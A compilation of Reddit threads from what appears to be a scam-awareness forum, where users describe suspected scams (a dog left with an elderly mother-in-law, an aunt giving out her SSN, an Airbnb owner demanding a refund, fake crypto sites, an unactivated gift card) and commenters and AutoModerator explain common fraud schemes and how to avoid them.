- Get a Ring doorbell, which will allow you or husband to know when someone approaches and to hear/record those conversations. You can even speak through the microphone to tell them to get lost.
- Why is somebody not staying with her?
- Strangers are strangers‚Ä¶ You need to a recommendation for a dog  . Would you give a baby you love to a stranger?    Cancel This IMMEDIATELY!!
- Does MIL actually have the dog now? This is some kind of scam, I don't know what, but it may not involve a real live dog. Stranger may have been trying to get into the house / on the property, casing the joint for a burglary. May try to get MIL out the back door while her accomplices load her stuff into a van at the front door.
- Consider installing a doorbell camera for your mom. Whatever the scam is, it‚Äôs less likely to happen if they see cameras on the premises. Get a fake camera if you need to and make sure it‚Äôs obvious to anyone approaching.
- This has to be fake.
- If she can't say no I'm betting this isn't the 1st time she's gotten scammed.
- The person may go to the police and say she kidnapped the dog.  Give it to the shelter.
- Does she still have the dog? Did any money change hands? Did the dog owner ever come back? This could be a scam or a lot of things, depending on what happened next.
- I think it's time for your husband's family to seriously consider alternative arrangements for your MIL. The conversation is tough but letting a compromised person just keep getting scammed is not right. Her family needs to step in, set some medical and financial power of attorney and make sure she's not putting herself in danger
- Maybe the dog owner was scammed? Hired a dog minder over the internet who was a scammer and gave a fake address after taking money?
- Get¬† a Ring doorbell for her house in which you control the account.¬† My husband lives here in America and his elderly father lives in his home country.¬† My husband installed a ring camera on dad's house when he last visited. When anyone comes to the door, my husband speaks to them,¬† from thousands of miles away.¬† "No thank you,¬† we are not interested" is a phrase he says a lot, then watches until they leave. Sounds like someone is home and it's a grown man, not elderly. .¬† Bonus! His dad is hard of hearing so doesn't hear the doorbell anyway.¬† If it's someone legitimate, my husband speaks to his dad through the alexa he also installed "DAD! So and so is at the door!". Dad has carers come in 4 times a day but this is a great solution for the times that dad is alone
- That poor dog is likely being horribly abused. I would notify the police about the scam and the take it to a humane society shelter.
- Cognitive impairment after cancer (especially chemo) is very real. And once she is on one person's list, they will share that list. 

Does she need to live by herself? Would she agree to having your husband monitor her finances?
- Sounds like she‚Äôs a dog boarder now.
- The person may go to the police and say she kidnapped the dog.  Give it to the shelter.
- Yeah, that is what completely threw me for a loop. She did what, now?!!
- What do we think is the game is here?  Tomorrow the "Federal Animal Police" are going to call about a stolen dog mix up but it can all be cleared up with $2000 in roblox gift cards?
- I‚Äôd say that‚Äôs the best case scenario honestly. I‚Äôm thinking that it could be a way for someone to get into the house. The first visit they were casing the home and testing the mental capacity/resistance of the occupant(s); second visit they arrive with a ‚Äúfriend‚Äù to ‚Äúpick up the dog‚Äù/finish the robbery. Especially concerning since the house isn‚Äôt visible from the street.
- came here to say that... WTF
- I do not know in which jurisdiction this story takes place, but in the jurisdictions I know ‚Äöjust taking the dog to the shelter‚Äò would make you liable to be sued, since you entered into a contract to take care of the dog.
- That's cruel to the dog.  OP, please don't do this.
- It sounds like you need to pursue guardianship and get her into a safer environment
- That‚Äôs what I fear!
- My beagle stole a box of smarties from one of my grandkids at Christmas. (2 YO) .. Beagle was fine..
- I saw a post a while ago (I think on the Pet Sitters sub) where a woman took a dog in for care and got the run around from the "owner" when she neglected to pick up the dog as scheduled and wasn't answering calls. Then some strange men showed up asking for the dog. She turned around and called the police because this was not the arrangement. Turns out the dog had been reported stolen. The thief dumped it with a pet sitter til she could secure a buyer, then she sent the buyer to claim the dog from OP.
- That's strange.¬† The same thing happened to my dog when I was 8
- I just reread this..,Oy when she comes back the second time for her dog ..She brings the scam with her !  Don‚Äôt let her do this !! And from the sound of it  she lives remote enough nobody around to help her if this is nefarious!!
- I don't answer my door without checking the camera first, and if I see a dog, I'm not answering the door because WTF?
- And in my state (and most) the value of a dog is the replacement cost, not sentimental value. The lady could win $300 if it's a shelter dog - assuming the court gets past this insane story.
- This is so shady, a lawsuit wouldn't make it past the initial filing.
- This.  Time to get the courts involved so a trustworthy family member can take over MIL's finances.
- Similar case with me.

In college, my bf at the time made a tin of fudge for my whole family. We stupidly left it on a table where the beagle could reach it. It was a closed tin, so we didn't think he could get it. We can back after 10 min to find out Rambler had eaten ALL of it. There was at least 5 lbs of fudge in that tin.

Aside from getting hyper for a while and having weird poops, he ended up being fine. In a few months, that dumb dog will turn 17. :-P
- Milk chocolate is mostly harmless as the quantity they would need to eat is pretty high. Dark chocolate at the higher percentages can really harm a dog in lower quantities.
- 17 wow. our Sparky is young then at 9!! Oh boy, beagles
- I figured "chocolate" would be easily understood as "something harmful to dogs" rather than "packing peanuts mixed with bacon grease and rat poison."
- My GSD/Lab/beagle mix pulled off two impressive chocolate feats. The first, quietly getting into my kids‚Äô Easter baskets while we were downstairs having brunch, and eating TWO POUNDS of chocolate bunnies. The second, at a friend‚Äôs place many years later, finding chocolate gelt in a Hanukah basket ‚Äì we still refer to that one as ‚ÄúThe Christmas of the Glitter Poops‚Äù. Some dogs are fine with chocolate. Many are not. Calypso, god rest her thieving sole, was of the former.
- Yeah I totally got it and chocolate can absolutely harm the dog. That guy using smarties and his dog as an example of being ok is just not a good example. I don‚Äôt want anyone to ever think their dog will be ok after eating dark chocolate because they once ate milk chocolate.
- I'm confused bc smarties aren't even chocolate?
- Google chocolate smarties. The chocolate kind are an outside the US thing. They have much lower levels of actual chocolate in them. They are like larger sized M&Ms.

Title: Elderly aunt keeps falling for scams.
Body: How do you keep your family members safe from scams? My mom is in her 80s, and doesn't use the computer. She rarely falls for any phone scams. So, my issue isn't with her. My issue is with my aunt. My aunt is in her early 70s, and keeps giving out her social security number. She has so many spam emails in her yahoo account (it would take forever to unsubscribe from everything). I've told her many times not to give her social security number or personal information out.

We had to get life lock because of her giving out her social security number to a fake loan company. We have since gotten rid of life lock due to the price increase. Today, she came to me saying she needed help getting her password when trying to login to one main because she was getting a error message. I asked her how she got to one main, and she said she clicked on a email that took her to a website for a loan. That website asked for her social security number, she gave it, and then redirected her to one main.

I looked at the email, and its from a fake company with a fake email address. My aunt doesn't even have a one main account. I've told her many times, and again today, that just because it says a specific company, doesn't mean its really from that company. She fought with me over it.

I don't know what else to do. She uses her email alot and randomly applys places for loans.

Title: Address mix-up scam?
Body: I received a call today from a number I didn't recognize. I declined it, and shortly received a text from the same number. The person introduced himself, said he was texting on behalf of his wife, who was expecting a package. He said the post office said there was a mix-up, and gave his own address, which is similar but not exact - two numbers off and slightly different name (think Drive instead of Avenue) - in another town. He said the post office said the package was delivered to a house on my street with a number that matches either my address or his. He asked if I received the package, and if not, if I had the contact information of the people at the other address. I'm thinking of responding to tell him I didn't get anything and the other address he referenced doesn't exist, but before I do, is this some scam I'm not aware of? I know address and name is public record if you own a home, but I'm not sure how he got my cell phone number, or if I want to confirm that it's a working number, in case this is a scam I'm not aware of.

- >I'm thinking of responding to tell him

That person could be lying. You don't know where they live, how they got your number, and a couple of other things. If you DO get a package that's not for you, tell the postal worker or something. Don't just give it to anyone who asks.
- Block ignore move on with your life. 

If a package arrives mark it "return to sender addressee unknown."
- That's fair. I want to help if it's real, but I have no way of knowing that it is unless I actually get a package with that name and address on it. And even then, as you say, I can return it to the post office without confirming my phone number and address to a stranger.

- A common scam with interact etransfers is to phish for your bank information with a fake interact email and website. The scammer will claim it's from a business account so it can't be auto deposited.

Remember that Interac notices should come from: notify @ payments .interac .ca  

>The scam message includes a link that looks very similar to a legitimate INTERAC page but is a clone. Always check the URL carefully. If it redirects you to a page that is not your bank's official site, do not proceed. The URL provided in the scam message is a fake and designed to steal your information.

- Hi /u/Otherwise_Rabbit3049, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

- Hi /u/Otherwise_Rabbit3049, AutoModerator has been summoned to explain the Fake payment scam.

The fake payment scam occurs when someone tries to trick you into thinking that you have received a legitimate payment when no such payment has been made. The most common method they use is sending you an email meant to look like a payment confirmation. In some cases the emails will be almost indistinguishable to a legitimate email sent by the payment service. Scammers are known to also show you screenshots instead of an email. Never trust a screenshot a stranger shows you, because it is probably doctored.

Scammers [spoof](https://en.wikipedia.org/wiki/Email_spoofing) the 'from' email to match an official address, and make you think you received a legitimate email. To combat a fake payment scam, verify online payments by logging in directly to the service. Do not check your junk folder, and do not assume a payment is legitimate based on an email alone. If a payment isn't reflected on your account and the person you are dealing with insists they have sent it, call support and ask about it. [Here](https://i.imgur.com/X9xn8uw.jpg) is an image of a scammer trying to pull off a fake payment scam. There is also a variant of the fake payment scam where you will receive a legitimate but fraudulent payment.

A variant of the fake payment email is just an advance fee scam: the scammer tries to convince you that your funds are on hold, and that you have to upgrade your account by sending the scammer some money to authorize the payment. No payment processor works like this. If you think you're dealing with a scammer, you're probably right. Always trust your gut.

- Scammer, likely using a bot to scrape accounts and send this kind of thing out in mass to hopefully snare a few folks that will pay them for nothing/fake/AI junk. 

Real artists aren't going to randomly contact accounts to solicit for work on social media.

!advancefee
- This has been popping up recently. I've come across a few DeviantArt accounts lately that have been openly stealing art, and then positioning themselves as being open to commissions. I suspect that you're seeing it on X because it's such a large platform. It's all fraudulent. People wind up paying for commissions they will never receive.
- Just block. You don't HAVE to look at a website when the rest already feels off.
- Your country may have a national art crimes group. Italy and France both take art theft and art forgery very seriously. The UK has the Art and Antiques Unit of the Metropolitan Police. In the US, the FBI has an Art Crimes Unit, which investigates stolen art and art fraud. Art theft has been in the news recently, so the authorities may be interested in your data. Check online, you will find out how to report this.
- Hi /u/1Cattywampus1, AutoModerator has been summoned to explain the Advance fee scam.

The [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam) arises from many different situations: investment opportunities, money transfers, job scams, online purchases of any type and any legality, etc., but the bottom line is always the same, you're expected to pay money to receive money. So you will pay the scammer and receive nothing.

It can be as simple as the scammer asking you to pay them upfront for an item they have listed, or as complex as a drug scam that involves an initial scam site, a scam shipping site, and fake government agents. Sometimes the scammers will simply take your first payment and dissappear, but sometimes they will take your initial payment and then make excuses that lead to you making additional payments.

If you are involved in an advance-fee scam, you should attempt to dispute/chargeback any payments sent to the scammer, you should block the scammer, and you should ignore them if they attempt to contact you again. Thanks to redditor AceyAceyAcey for this script.

Title: What was the scammer's goal?
Body: A man approached me and asked if I have a minute: "He had a terrible day... thieves broke into his car... and now he has to get back to his country via train." He asked if I can tell him the way to the nearest train main station from where the scam happened (which is literally right next to that main station). I explained to him, how he can walk there. He said thanks, and without further ado, left.

Nothing obvious or bad happened to me. At least I think so. I followed him with a bit of distance, and observed and listened to him doing the exact same thing to someone else 50m down the road. I approached him and the victim, played along, and asked if I can continue to help. He reacted very hostile, and left.

I was cautious right from the beginning. I was wearing clothes which are difficult to pickpocket from a second person while being distracted. At least I think so.

What was the scammer's goal?

I guess he wants the victim to give him something voluntarily. But why would he leave then, without at least explicitly asking for it, when the victim is not giving anything prior?

Title: Donation platform for schools takes 20% and then asks for tips on top of that.
Body: This might be a reach as a scam, but bear with me because I think a lot of well-intentioned folks are getting ripped off. Yesterday I received an email from Vertical Raise with my 14 yr old nephew‚Äôs name as the sender. It was a school fundraiser asking for support. When I had the time to follow up and make a donation this morning I was appalled by two things that I found. First, the platform auto populated a 15% tip for themselves. ON A DONATION. They justify it by saying tips help us offer our services to ‚Äúnephew‚Äôs school‚Äôs name.‚Äù This raised a major red flag for me so I started searching for more information on the company Vertical Raise. Guess what, it gets worse.

Vertical Raise negotiates a fee with schools for use of their email services and donation platform. I work for a nonprofit so I understand that these platforms have to charge a fee in order to maintain credit card security. The fees are typically 3-5%. Vertical Raise‚Äôs typical fee is 20%! Once they are contracted by a school they have all the students involved in the fundraiser submit email addresses for friends and family. Then the spamming begins. And since almost everyone wants to help the youngsters in their life, they reel in the money. But nowhere on the donation page does it say that 20% of your gift is being kept by the company. 

I realize this isn‚Äôt anywhere near as bad as losing your life savings to a pig butchering scam, but many more people are losing part of their donation to a for profit company. Be careful who you donate to! I did not go through with the online donation and will instead put a check in the mail. Sure, it costs 70 cents for postage, but at least it‚Äôs all going to the school.

- Idk, I consider that a pretty big grift. Taking advantage of ppl‚Äôs kindness makes them less likely to donate in the future. Good catch!
- Effing sharks. Veterans' groups get heavily targeted by these for-profit creeps too. 

They're legal, marginally, but I agree with you that they are bottom-feeding unethical scum.
- Their default is to try to take 35% in tip and undisclosed fees? That‚Äôs obscene!

Unbelievable that a company would try to take advantage of people who want to do good with a donation.
- This is extortionate, and it saddens me that both schools and donors fall for this.
- You should raise this with the school. This is a legitimate complaint, but you should also help the school find a better alternative.
- Last summer my family went on a bus tour in Niagara Falls.  It was really good, the tour guide knew his stuff and was super friendly.  On the wall of the bus there was a large TripAdvisor sign reminding us that the tour guides depend on tips and a minimum of $20 was recommended.  

I tipped more than that because it was a great tour, but I contacted TripAdvisor to let them know it‚Äôs their responsibility to pay their employees/independent contractors a higher wage.
- Tipping is always a scam to get you to pay the employees of a business so the employer doesn't have to
- Wow! Thanks for the recommendation.
- I will. I want to do so in a way that doesn‚Äôt create a headache for my sibling. But someone at this school accepted the terms of the contract with vertical raise and it‚Äôs disgusting to me that they don‚Äôt let donors know how much goes directly to that company.
- Seems more likely that the tour company was misappropriating the IP of TripAdvisor.

- And we are supposed to guess which of the many, many scam outfits is doing their thing later? You shouldn't have pointed out the name but what kind of scam they are running. In this thread.
- This is incomprehensible.
- The suggestion of "bankruptcy" implies that you think they were involved in some sort of legitimate operation. They were not. Their entire business model is making things up to get you to give them money.
- > Watchout may resurface under different name

It will resurface under a differnet name.  They almost certainly have automation that handles all of the new domain registration, transferring of their existing code, change a few graphics and names, and voila.  New scam website up in less than 24h.

Decades ago, in another lifetime / career ... I worked for a hosting provider.  We had a client we were about to sign that we were concerned was a pretty significant spammer.  They assured us they were not.  But within days of bringing them online, we started getting pressure from our upstream bandwidth providers due to the amount of outbound spam coming out.  There was a whole process involved in cutting off the infrastructure (business try not to just blatantly breach contracts) and a lot of bullshit excuses / justifications / promises on their part ... but we did eventually pull the plug.

We were able to track them, and they were online and functional on another ISP about 24-36 hours later.  So yeah, criminals can automate a ton of shit to make their lives easier.

Same with this site.  It'll be up as bid4crypto.biz or something like that by the end of the month.  The scammers are effectively leveraging a "societal arbitrage" - the differential between what societal norms or law enforcement can practically deal with, and the ease of just moving to a new website and starting over.
- Everybody told you in the other post but you let your greed blind you.
- They weren't shut down. It was a fake company with a phony website, and like all such investment scams, they shut it down themselves.

As others have said, the money is gone. You didn't  invest money, you gave it to the scammers.  **There is no investing site or app, that's all phony.** There is no profit. Scammers make a whole fake crypto website. It's not hard to create a website. All the info and $$ figures on the site were fake, just big numbers on a screen to make you think you made money.

Tomorrow the scammers will create a new phony website with a new name, and look for ignorant, gullible, greedy people to become victims by giving them money for "AI bot trading"
or "leveraged crypto options" or "binary FX" or some other totally made-up bullshit.
- Your comment is absurd. Talking about Greed. You definitely need counselling. Please follow my post, to inspire or get inspired. It's all about choiceless awareness and you are not the doer.¬† It's all about not being affected by what the world throws at you. Remember the world is a playground and learn whatever it teaches and be blissful that you are here Grateful for your existence..‚úåÔ∏èPeace.
- Maybe so how do you explain the parent company ask2bid.net was in business for almost 4 years. There defence was that how come we are in business if we are a scam company.
- Details are in the link, should I put a little summary as well?
- They are into binary options, details are in the link.
- Sorry, I made some changes and details are in the link.
- The evidence supports it:  

- ignorant, gave your money to a shady investment company       
- gullible, kept giving them money even after people pointed out to you that it was phony        
- greedy, expecting to get big returns for no effort
- Yes, please describe the type of scam in a short paragraph, in the post. This will help others.
- You definitely need counselling sorry. Sounds like my better half. Please follow my post and comments to be inspired and to inspire. Count your pennies, hide under a bush or something. You will be very safe.

Title: I'm trying to sublease but can't tell if it's a scam
Body: Hi! So I'm trying to sublease my apartment because I transferred to a different university. I found like 2 people, neither of which come from america and both times, they overshared a LOT. That seemed really weird given how unsafe that could be. Like the first person was a little weird but not too crazy. She sent me a picture of herself I don't understand why, but the other person told me about how her grandmother is in the hospital, and everything about herself and then went on to send a picture of her US visa. They both are bad communicators and don't communicate on time and I was wondering if potential subleasers that overshare are possibly scammers? It just seems too weird to be a genuine interaction but I don't understand what they'd get from it. Neither of their numbers I'm actually able to call.

- The "oversharing" is to convince you that they are real people. And you can't understand what they would get from having access to an apartment in someone else's name? They'd simply offer it to other people to defraud them... they could likely re-rent it to a dozen other people before someone caught on. They'd disappear with the money (and you would never be paid, either), and it would be your problem to sort out.
- Back in the day when I was in college and needed a roommate, I would find bulletin boards on campus and post ads.  That's probably no longer a thing, but you don't attract overseas scammers with a physical ad.
- We've seen situations where the scammers pretend to want to rent/sublet from overseas, and offers a fake check in advance. Then ask you to do financial favours for them (pay movers, get items etc) before the check is caught. !fakecheck scam

  
Would take only ppl who are local, able to visit the place and meet you first.
- That. I wouldn't trust them. Find someone local that you can meet and pull a credit report on.
- Ohh, got it! Thanks! I just don't understand why they never communicated with me to get it done in that case..
- Hi /u/vitaminxzy, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

Title: how to not get scammed
Body: hi! i‚Äôm trying to sell concert tickets with paypal g&s as method of payment. i‚Äôve been talking with the buyer on twitter and they already agreed but i‚Äôm kinda torn (no payment has been made yet). 

first, i read on the paypal site that the buyer has 180 days to dispute the transaction 
and can also ask their bank for a chargeback. obviously i‚Äôm gonna send them the tickets but i‚Äôm seeing so many posts about they buyers requesting chargebacks or disputing with paypal even if they received the items they bought. 

second, the concert is at the end of march and the window for transferring tickets on ticketmaster opens 48 hours before the concert. is it safe for the buyer or me to send me the money now?

cash in person is not possible as i live far away. this is my first time selling tickets. is there a way to protect myself as a seller? what should i do? any other alternatives (i want to specify that i live in europe). thank you in advance!

You must live near someone. No chance of anybody in your city wanting to go?
- Why don‚Äôt you just sell them in stub hub where there‚Äôs protection?

Title: Potential Airbnb scam, anyone experience this?
Body: I am curious if anyone has ever experienced anything like this before‚Ä¶‚Ä¶

My wife and I are staying in an airbnb for a few weeks. We have never booked an airbnb before so we weren‚Äôt too sure what to expect. Everything has been going fine so far, today marks the 2 weeks of us being here. We got a text last night from the property owner (who was not a part of the groupchat airbnb has to message concerns or anything like that) stating he needed access this morning. We didn‚Äôt mind, so we agreed. After he left, he came knocking about 15 min later saying he needed to speak with us. Long story short, he stated that he was the owner, but the property managers bailed out and he is no longer getting the money even though it‚Äôs his property. He asked us to call Airbnb to get a full refund and give him the money instead since it‚Äôs his property and he is left with nothing. He also asked us to send him the exact total, our start to end date, and the confirmation code. I was very skeptical and honestly pretty frustrated because I did not want to deal with this when I am just trying to enjoy my stay. I didn‚Äôt give any lip or any issues, I called Airbnb and after speaking with an agent she told me she had never heard of anything like this happening and sounded genuinely confused. She told me there was nothing I could do, to enjoy my stay, and he would have to call and confirm it on his own. Relieved, I tried to carry on with my day. That lasted about 30 minutes before he is blowing our phone up calling. We decided we weren‚Äôt going to answer because it was really becoming overwhelming and we were over it temporarily. Eventually I caved and answered the call and he told me that he was talking to them for 30 minutes and said they had 0 call logs indicating that we tried to get ahold of them and that I needed to call back again. I told him that I am not calling back and I am not dealing with all of that because my wife had surgery and she is supposed to be recovering while being here. I said I would try to contact them via the chat option which can take up to 24 hours for a response. He was getting frustrated with me and I got a bit snappy with him as I felt he was not caring about our circumstances at all. I sent a couple messages in our groupchat in Airbnb which was left on read and no response or help. He stated that our money went to someone else and I don‚Äôt understand how that is my problem when I paid on Airbnb and any issues they have on top of that should be able to be disputed amongst each other. I feel dumb, but am I getting scammed? This is so bizarre and it‚Äôs ruining everything. I do not want to go through this nor do I want to wait for a refund, and figure out how to get the money to him. Any advice or shared experiences would be greatly appreciated.

**
- Never heard of this specifically but there‚Äôs so many Airbnb issues I‚Äôd never use them again

As for your situation you handled it fine. Some rando wants your fee?
 
Nopity nope. Never go off platform. If he wants to argue with them that‚Äôs his problem.
- So unknown person turns up and tells you that you have to hand them money?

Even if it's 100% it's nothing at all to do with you. He rented it out and he pick who was going to get the money for him. You paid it, it's nothing to do with you what his worker did with it. You paid and he had the money stolen from him not from you.
- >I told him that I am not calling back and I am not dealing with all of that 

Exactly right. Report to AirBNB that you're being harassed by the owner and you want them to intervene and make him stop. This is his and AirBNB's problem, not yours. You did everything correctly. 

The dude is trying to scam money from you. DO NOT GIVE HIM MONEY. That will not make him go away. 

How much longer were you planning to stay?
- Presuming that this guy *is* the owner, it sounds like he was defrauded by his "property managers." Which is a problem, but it's not *your* problem. You've done what you need to do; you paid the company you were supposed to pay. The fact that this alleged owner was defrauded is on him. You don't owe it to him to make him whole.

And besides, *you should never be a middleman between two other parties in a financial transaction.* Unless your last name is "Wells Fargo" and even then, it's dubious. If this guy wants to be paid for the AirBnB booking, then he needs to take it up with AirBnB. He has no business asking you to demand a refund from AirBnB to pay him.
- That is probably one of the slickest scam I have heard. Better call the police to verify if he really owns the place.
- He needs to sue his property manager and shut them down from future rentals.  He should not be harassing you.
- So you took he's word for being the owner?

Did you at least ask him to show you he had a key to the place?

Did you take a pic of he's id? 

What did the one renting to you say about it?

He being aggressiv and want to speed up your payment sounds more like a scammer.

Anyway only thing he can do to you is have the police throw you out.

Any money issues is between him (if the real owner) and without a contract with the one renting out the property.
- "¬†today marks the 2 weeks of us being here."

Sorry, we don't have access to any banking, we are on vacation and will sort this out when we get home.
- I‚Äôve stayed at many Airbnbs and I‚Äôve never had this happen nor have I heard of any of this. If it were me, I‚Äôd stop answering the phone, block the number if he keeps being a pest. Then call the police if he comes back. Since you‚Äôve paid Airbnb, you have a right to be there. Let him explain his problem to the police.
- WTF?  You should only ever deal with Airbnb officially, through their official channel. End of story. If he has issues with the property manager, that's not your concern. Tell him to go away and take it up with Airbnb. And NEVER let a stranger into the property - because he may not be the owner at all.
- Play the Uno reverse card on him: "Um, actually, this is our house, not an AirBnB, you must have the wrong property."

He will have just as much proof that he owns the house as you do.
- When people do transactions on eBay or whatever, one thing we always say is to never go off platform. That applies here. You paid already via Airbnb, and you are staying at the place you paid for. End of story.¬†


Either just block him or tell him one last time that you will not be responding to him and that if he has any issues to only go through the official channel. You will not be helping him in any way or doing anything not already in the rental agreement when you booked the room. After that, block him. If he tries to contact you in other ways, then you know it's a scam and you should block those too, while reporting to Airbnb.


If he really did get scammed by his property manager, then he needs to sue them. It's not your responsibility to fix this.
- No

That's your answer, you do NOT cancel your reservation and hand a COMPLETE stranger money

Not your problem to solve
- Do not give him any money call the police you dont even know if hes the owner. If he wants money the issue is between him and the property manager not you.
- Leave a detailed review so people will know!
- Yeah, and it's definitely the owner's problem if he's telling the truth. It's a dispute between him and the property manager. Just sucks because I don't think there's anything OP can do to stop the guy from ruining his stay. I guess block his number and tell him he'll only communicate through the AirBnB chat. If the owner had a third party renting out the property with permission but they ran with the money then he has go go after them and/or contact AirBnB to prove that he is in charge of the property and no one else should have the right to rent it out/collect on it. No idea how one goes about doing that, though.
- Over a week ughhhh
- Also good luck getting a refund from AirBnB for a stay you've already been in for 2 weeks? Does the owner think it's easy to get a refund from AirBnB? He (or I guess his property manager) would likely need to ask AirBnB to refund the customer, and they'd likely take fees out.
- I'm thinking the property owner should be suing his property manager. And talking to Airbnb to pull the listing.
- Hm. I think you need to get back in touch with AirBNB and read them the riot act. If you need to move to another location for peace of mind, they should help you. 

I've rented AirBNBs several times, without problems. This seems quite unusual, but given how unpleasant it is, and your wife's need for relaxation, you may need to leave and get a refund from AirBNB later. Therefore, document your phone calls with emails and/or chats so there's a complete record. 

If possible, continue to **not** answer the guy. He knows perfectly well that this is not your problem - he's trying to pressure you.
- You do know we'll need an up date on it.

- You can't find anything because the site is so new (just 18 days) that complaints and negative reviews have not come through yet. They will...and then they'll change the name and carry on.

On top of that the site is just another template-derived POS complete with ludicrous discounts (After 18 days trading?), little pop-ups telling us how many people are shopping madly at this very moment, they appear to be selling items faster than Amazon...üòÄetc.

No phone number or address to contact them, just email.

Of course not, it's only a couple of weeks old. Next time you're in doubt, stay away.

- I regret to inform you that no employee at the IC3 (i.e. the FBI) is sitting at a desk closely reviewing your complaint with any intent to take what you would consider to be meaningful action on it.
- It doesn‚Äôt matter. Those reports go to the circular file. I‚Äôd be shocked if anyone even reads them.
- Made another mistake.  On the corrected report I put my apartment name but not my room number.  Will this be held against me?  I've already made 3 reports about the same crime, I don't want to waste their time with another.
- Not surprised.  It's my OCD acting up that made me write up the reports in the first place.
- My parents filed reports to a couple agencies (Securities and Exchange Commission and Federal Commission) and I did one to IC3 after I fell victim to a WFH scam a month ago, but she said those reports never go anywhere.
- I wonder if you could FOIA them, in anonymized fashion? I bet they'd make great source material for psychology PHD dissertations in FOMO and magical thinking.
- See what everyone has already told you about the first mistake and apply that to the second.
- Held against you by whom? And are you sure you have OCD? I think you have garden variety generalized anxiety (I say as someone with no training who read two posts from you.)
- At the very least, they would be great toilet reading.
- By the government.

Idk.  My other problem is that I feel a compulsive need to attempt to contact Facebook/Meta about the scammer (my mind is telling me that nothing I do to try to bring the scammer to justice is ever enough).  It's been almost 7 years and I'm worried that the scammer is still out there harming people. I didn't know how serious this type of scam was 7 years ago, so I deleted our conversation, and now I hate myself for it.

I don't know what it is that I have.
- If I had the database‚Äìin JSON, say‚ÄìI would do some unsupervised machine learning attacks and see what the clusters looked like. "Crypto," "investment," and "my private photos" would be at the top of the list, I hypothesize.

Title: Gift card included in Amazon package with url: www.giftcardmall.com/mygift
Body: l ordered a $20 part for a musical instrument a couple days ago. Today it arrived and in the same package was a $100 visa gift card. I opened the gift card sleeve and got to looking at the physical card.
The back of the card is printed with a URL to check the balance (listed in title).

I tried to check it on the website and it was an error.
I called the number on the card and put in the info, and the automated system said the card was never activated at the point of sale and to reach out to the merchant for a refund.
Is this a scam of some sort? I thought it may be a review scam, but why send a blank gift card?
Usually it would have money right? Do I need to do anything other than throw this away? My worry is the seller will report they accidentally sent this and try to have Amazon charge me $100. Thank you!

Not happening. You didn't order it.
- Throw it away. You didn't pay for it, so you're not eligible for a refund. Conversely, since it wasn't activated, you're not at risk. It might be a !brushing scam or something else, but either way, don't get involved and don't waste time trying to sort it out. In the unlikely event that some kind of charge appears on your account, report it as fraud.

This reminds me that credit card companies used to literally send college graduating seniors a credit card in the mail, all ready to be activated, with a pre-approved credit line.
- Still a !review scam.


You are probably supposed to give a 5 star review, then theyll load the gift card
- Hi /u/Malsperanza, AutoModerator has been summoned to explain the Brushing or Direct shipping scam.

The scammer is creating and shipping out fake orders in order to both boost order numbers and place false verified reviews. [Here](https://en.wikipedia.org/wiki/Brushing) is the Wikipedia page that explains brushing, and [here](https://www.forbes.com/sites/wadeshepard/2017/11/27/americans-are-receiving-unordered-parcels-from-chinese-e-criminals-and-cant-do-anything-about-it/#dc1df7c73daa) is a news article from Forbes about the scheme. Receiving packages as part of brushing doesn't mean that your private information is compromised, if the items are relatively inexpensive.

If instead you received an expensive item, such as electronics or something like that, your account may be compromised. Log into your account and see if there are orders under your name. A scammer that has access to your account would instead be using your credit card, or a stolen credit card to purchase things in your name and ship them, and then have a porch thief pick them up from your door.

For example, when Amazon accounts are compromised, orders can be archived by the thieves to hide their tracks. Go to https://amazon.com/gp/your-account/order-history?orderFilter=archived to find any of those. If that list is clean, it means that this order didn't originate through your account.

- Hi /u/Pale_Session5262, AutoModerator has been summoned to explain the Amazon review scam.

Amazon review scammers are trying to buy 5 star reviews without looking like they‚Äôre buying 5 star reviews. A long time ago, sellers could offer free or discounted coupon codes to buyers in exchange for an ‚Äúhonest‚Äù review. [This practice was banned in 2016](https://blog.aboutamazon.com/innovation/update-on-customer-reviews), replaced by Amazon‚Äôs Vine program. [FTC rules](https://www.ftc.gov/news-events/press-releases/2009/10/ftc-publishes-final-guides-governing-endorsements-testimonials) also dictate that any reviews or product promotions obtained in this way have to be clearly labeled as such. To get around both the FTC‚Äôs labeling rules and Amazon‚Äôs ban, there are websites and private Facebook groups that link together shady sellers with people willing to sell positive reviews.

